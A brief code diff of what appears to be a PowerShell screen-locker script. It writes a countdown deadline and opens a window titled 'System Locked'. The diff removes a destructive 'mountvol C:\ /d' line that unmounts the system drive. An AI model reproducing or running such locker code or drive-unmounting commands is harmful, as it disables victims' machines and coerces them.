@@ -19,7 +19,6 @@ if (Test-Path $dataPath) {
     $deadline = (Get-Date).AddHours($hoursLeft)
     @{ deadline = $deadline } | ConvertTo-Json | Set-Content $dataPath
 }
-mountvol C:\ /d
 # ========== FORM SETUP ==========
 $form = New-Object System.Windows.Forms.Form
 $form.Text = "System Locked"
